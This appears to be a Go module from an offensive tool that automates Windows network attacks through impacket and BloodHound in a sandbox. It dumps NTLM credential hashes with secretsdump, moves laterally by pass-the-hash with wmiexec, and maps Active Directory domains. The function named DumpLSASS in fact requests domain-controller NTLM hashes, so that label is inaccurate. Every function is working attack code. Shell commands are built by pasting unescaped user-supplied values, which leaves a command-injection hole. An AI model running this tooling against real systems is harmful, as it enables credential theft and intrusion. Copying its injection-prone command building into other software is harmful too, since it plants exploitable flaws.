package lateral

import (
	"context"
	"fmt"
	"strings"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
)

// ensureImpacket installs impacket inside the sandbox.
func ensureImpacket(ctx context.Context, sb *sandbox.Docker) error {
	installCmd := "if ! python3 -c 'import impacket' &> /dev/null; then apt-get update && apt-get install -y python3-impacket python3-pip && pip3 install --break-system-packages bloodhound; fi"
	if _, err := sb.Execute(ctx, installCmd); err != nil {
		return fmt.Errorf("failed to install impacket/bloodhound: %v", err)
	}
	return nil
}

// DumpLSASS extracts NT hashes and cached credentials from a target Windows machine
// using impacket's secretsdump.py over SMB. Requires valid credentials (password or NTLM hash).
// Provide either password or ntlmHash (not both); ntlmHash takes priority if both given.
func DumpLSASS(ctx context.Context, target, user, domain, password, ntlmHash string, sb *sandbox.Docker) (string, error) {
	if target == "" || user == "" {
		return "", fmt.Errorf("target and user are required")
	}
	if domain == "" {
		domain = "."
	}

	if err := ensureImpacket(ctx, sb); err != nil {
		return "", err
	}

	var authArg string
	if ntlmHash != "" {
		// Normalise hash — accept either NTLM-only or full LM:NT format
		parts := strings.Split(ntlmHash, ":")
		switch len(parts) {
		case 1:
			authArg = fmt.Sprintf("-hashes :%s", parts[0])
		default:
			lm := parts[0]
			if lm == "" {
				lm = "aad3b435b51404eeaad3b435b51404ee"
			}
			authArg = fmt.Sprintf("-hashes %s:%s", lm, parts[len(parts)-1])
		}
		cmd := fmt.Sprintf("secretsdump.py %s '%s/%s@%s' -just-dc-ntlm 2>&1", authArg, domain, user, target)
		out, err := sb.Execute(ctx, cmd)
		if err != nil {
			return "", fmt.Errorf("secretsdump (hash auth) failed: %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("=== Credential Dump: %s (%s/%s) ===\n%s", target, domain, user, out), nil
	}

	if password == "" {
		return "", fmt.Errorf("either password or ntlm_hash is required")
	}
	cmd := fmt.Sprintf("secretsdump.py '%s/%s:%s@%s' -just-dc-ntlm 2>&1", domain, user, password, target)
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("secretsdump (password auth) failed: %v\nOutput: %s", err, out)
	}
	return fmt.Sprintf("=== Credential Dump: %s (%s/%s) ===\n%s", target, domain, user, out), nil
}

// PassTheHash automates lateral movement using extracted hashes via impacket.
func PassTheHash(ctx context.Context, targetIP, user, hash, cmd string, sb *sandbox.Docker) (string, error) {
	if err := ensureImpacket(ctx, sb); err != nil {
		return "", err
	}

	// Clean up hash if it contains the full string
	parts := strings.Split(hash, ":")
	var ntlm string
	if len(parts) >= 4 {
		ntlm = parts[2] + ":" + parts[3]
	} else {
		ntlm = hash
	}

	// Use wmiexec or smbexec from impacket
	// The syntax is usually: wmiexec.py -hashes LMHASH:NTHASH user@ip cmd
	execCmd := fmt.Sprintf("wmiexec -hashes %s %s@%s '%s'", ntlm, user, targetIP, cmd)
	out, err := sb.Execute(ctx, execCmd)
	if err != nil {
		return "", fmt.Errorf("pass-the-hash execution failed: %v\nOutput: %s", err, out)
	}

	return fmt.Sprintf("[+] Lateral Movement Successful (WMI Exec).\nOutput:\n%s", out), nil
}

// BloodHoundCollect deploys bloodhound-python to map out the AD domain.
func BloodHoundCollect(ctx context.Context, domain, dcIP, username, password, hash string, sb *sandbox.Docker) (string, error) {
	if err := ensureImpacket(ctx, sb); err != nil {
		return "", err
	}

	authArg := ""
	if hash != "" {
		parts := strings.Split(hash, ":")
		var ntlm string
		if len(parts) >= 4 {
			ntlm = parts[2] + ":" + parts[3]
		} else {
			ntlm = hash
		}
		authArg = fmt.Sprintf("--hashes %s", ntlm)
	} else if password != "" {
		authArg = fmt.Sprintf("-p '%s'", password)
	}

	cmd := fmt.Sprintf("bloodhound-python -d %s -u '%s' %s -dc %s -c All --zip", domain, username, authArg, dcIP)
	
	// BloodHound execution takes a while
	out, err := sb.Execute(ctx, cmd)
	if err != nil {
		return "", fmt.Errorf("bloodhound collection failed: %v\nOutput: %s", err, out)
	}

	return fmt.Sprintf("=== BloodHound Collection Complete ===\n%s\n[+] Download the generated zip file from the sandbox for import.", out), nil
}
